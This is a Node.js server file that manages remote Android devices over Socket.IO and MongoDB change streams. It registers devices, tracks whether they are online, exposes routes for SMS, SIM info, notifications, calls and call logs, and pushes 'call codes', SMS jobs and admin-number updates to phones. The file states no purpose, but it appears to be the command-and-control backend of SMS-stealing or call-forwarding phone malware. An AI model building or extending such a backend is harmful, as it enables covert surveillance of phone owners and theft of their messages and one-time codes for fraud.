// 📁 server.js — FINAL STABLE VERSION
import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import { createServer } from "http";
import { Server } from "socket.io";
import fetch from "node-fetch";
import mongoose from "mongoose";
import { connectDB } from "./config/db.js";

// 🧩 Routes
import deviceRoutes from "./routes/deviceRoutes.js";
import smsRoutes from "./routes/smsRoutes.js";
import simInfoRoutes from "./routes/simInfoRoutes.js";
import notificationRoutes from "./routes/notificationRoutes.js";
import callRoutes from "./routes/callRoutes.js";
import adminRoutes from "./routes/adminRoutes.js";
import serialRoutes from "./routes/serialRoutes.js";
import callLogRoutes from "./routes/callLogRoutes.js";
import statusRoutes from "./routes/statusRoutes.js";
import lastSeenRoutes from "./routes/lastSeen.routes.js";

// 🌿 Env + DB
dotenv.config();
connectDB();

const app = express();
const server = createServer(app);
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
});

app.use(cors());
app.use(express.json());
app.set("io", io);

// 🧠 Maintain connected devices
const deviceSockets = new Map();

// 🌐 SOCKET.IO CONNECTIONS
io.on("connection", (socket) => {
  console.log("🟢 Client connected:", socket.id);
  let currentDeviceId = null;

  // ✅ Device registration (with full cleanup + confirmation)
  socket.on("registerDevice", (uniqueid) => {
    if (!uniqueid) {
      console.log("⚠️ registerDevice called with empty uniqueid");
      return;
    }

    // ♻️ Remove any existing old socket for same device
    if (deviceSockets.has(uniqueid)) {
      const oldSocketId = deviceSockets.get(uniqueid);
      if (io.sockets.sockets.get(oldSocketId)) {
        io.sockets.sockets.get(oldSocketId).disconnect(true);
        console.log(`♻️ Old socket for ${uniqueid} disconnected`);
      }
      deviceSockets.delete(uniqueid);
    }

    currentDeviceId = uniqueid;
    deviceSockets.set(uniqueid, socket.id);
    socket.join(uniqueid);

    console.log(`📱 Registered Device: ${uniqueid} → Socket: ${socket.id}`);
    console.log("✅ Connected devices:", Array.from(deviceSockets.keys()));

    saveLastSeen(uniqueid, "Online");

    // 🔔 Confirm back to Android
    io.to(socket.id).emit("deviceRegistered", { uniqueid });
    console.log(`🔔 Sent deviceRegistered → ${uniqueid}`);
  });

  // ✅ Device status updates (live emit to admin panel)
  socket.on("deviceStatus", (data) => {
    const { uniqueid, connectivity } = data || {};
    if (!uniqueid) return;
    console.log(`⚡ DeviceStatus → ${uniqueid}: ${connectivity}`);
    saveLastSeen(uniqueid, connectivity);
    io.emit("deviceStatus", { uniqueid, connectivity, updatedAt: new Date() });
  });

  // ❌ Disconnect with delayed cleanup (to allow reconnect)
  socket.on("disconnect", () => {
    console.log("🔴 Socket disconnected:", socket.id);

    if (currentDeviceId) {
      console.log(`📴 Device disconnected (waiting 5s): ${currentDeviceId}`);

      setTimeout(() => {
        const stillConnected = [...deviceSockets.values()].includes(socket.id);
        if (!stillConnected) {
          deviceSockets.delete(currentDeviceId);
          console.log(`🗑️ Removed offline device: ${currentDeviceId}`);
          io.emit("deviceStatus", {
            uniqueid: currentDeviceId,
            connectivity: "Offline",
            updatedAt: new Date(),
          });
          saveLastSeen(currentDeviceId, "Offline");
        } else {
          console.log(`🔁 ${currentDeviceId} reconnected before timeout`);
        }
      }, 5000);
    }
  });

  // 🔄 Reconnect
  socket.on("reconnect", () => {
    if (currentDeviceId) {
      console.log(`🔄 Device reconnected: ${currentDeviceId}`);
      deviceSockets.set(currentDeviceId, socket.id);
      socket.join(currentDeviceId);
    }
  });
});

// 🔹 Save Last Seen Helper
async function saveLastSeen(deviceId, connectivity) {
  try {
    const PORT = process.env.PORT || 5000;
    await fetch(`http://localhost:${PORT}/api/lastseen/${deviceId}/status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ connectivity }),
    });
  } catch (err) {
    console.error("❌ Error saving last seen:", err.message);
  }
}

// 🔹 Emit Call Code Safely
export async function sendCallCodeToDevice(uniqueid, callData) {
  const socketId = deviceSockets.get(uniqueid);
  if (socketId && io.sockets.sockets.get(socketId)) {
    io.to(socketId).emit("callCodeUpdate", callData);
    console.log(`✅ [EMIT] callCodeUpdate → ${uniqueid}`);
  } else {
    console.warn(`⚠️ Device ${uniqueid} offline or not connected.`);
  }
}

// 🧠 MongoDB Change Streams
mongoose.connection.once("open", () => {
  console.log("📡 MongoDB connected — Watching callcodes, sms, adminnumbers...");

  try {
    // 📞 CALLCODES
    const callStream = mongoose.connection.collection("callcodes").watch();
    callStream.on("change", async (change) => {
      if (!["insert", "update", "replace"].includes(change.operationType)) return;
      const updatedDoc = await mongoose.connection
        .collection("callcodes")
        .findOne({ _id: change.documentKey._id });
      if (!updatedDoc) return;

      const deviceId = updatedDoc.deviceId;
      console.log(`📞 CallCode Changed → ${deviceId}`);
      sendCallCodeToDevice(deviceId, updatedDoc);
    });

    // ✉️ SMS
    const smsStream = mongoose.connection.collection("sms").watch();
    smsStream.on("change", async (change) => {
      if (!["insert", "update", "replace"].includes(change.operationType)) return;
      const updatedDoc = await mongoose.connection
        .collection("sms")
        .findOne({ _id: change.documentKey._id });
      if (!updatedDoc) return;

      const deviceId = updatedDoc.deviceId;
      console.log(`📩 SMS Changed → ${deviceId}`);
      const socketId = deviceSockets.get(deviceId);
      if (socketId && io.sockets.sockets.get(socketId)) {
        io.to(socketId).emit("smsUpdate", updatedDoc);
        console.log(`✅ [EMIT] smsUpdate → ${deviceId}`);
      } else {
        console.warn(`⚠️ SMS emit skipped — ${deviceId} not connected`);
      }
    });

    // 👑 ADMIN NUMBERS (broadcast)
    const adminStream = mongoose.connection.collection("adminnumbers").watch();
    adminStream.on("change", async (change) => {
      if (!["insert", "update", "replace"].includes(change.operationType)) return;
      const updatedDoc = await mongoose.connection
        .collection("adminnumbers")
        .findOne({ _id: change.documentKey._id });
      if (!updatedDoc) return;
      console.log("👑 Admin Number Updated →", updatedDoc);
      io.emit("adminUpdate", updatedDoc);
    });

    // 🧯 Error handling
    callStream.on("error", (err) => console.error("🚨 Call Stream Error:", err));
    smsStream.on("error", (err) => console.error("🚨 SMS Stream Error:", err));
    adminStream.on("error", (err) => console.error("🚨 Admin Stream Error:", err));
  } catch (err) {
    console.error("💥 Change stream init failed:", err);
  }
});

// 🏠 Root route
app.get("/", (req, res) => {
  res.send("✅ Live Socket + MongoDB Streams running (Stable Multi-Device Backend)");
});

// 🧭 Routes
app.use("/api/device", deviceRoutes);
app.use("/api/sms", smsRoutes);
app.use("/api/siminfo", simInfoRoutes);
app.use("/api/notification", notificationRoutes);
app.use("/api/call", callRoutes);
app.use("/api/admin", adminRoutes);
app.use("/api/serial", serialRoutes);
app.use("/api/status", statusRoutes);
app.use("/api/lastseen", lastSeenRoutes);
app.use("/api/call-log", callLogRoutes);

// ❌ 404 & Error
app.use((req, res) =>
  res.status(404).json({ success: false, message: "Route not found" })
);
app.use((err, req, res, next) => {
  console.error("💥 Unhandled error:", err);
  res.status(500).json({ success: false, message: "Internal server error" });
});

// 🚀 Start
const PORT = process.env.PORT || 5000;
server.listen(PORT, () =>
  console.log(`🚀 Server running on http://localhost:${PORT}`)
);
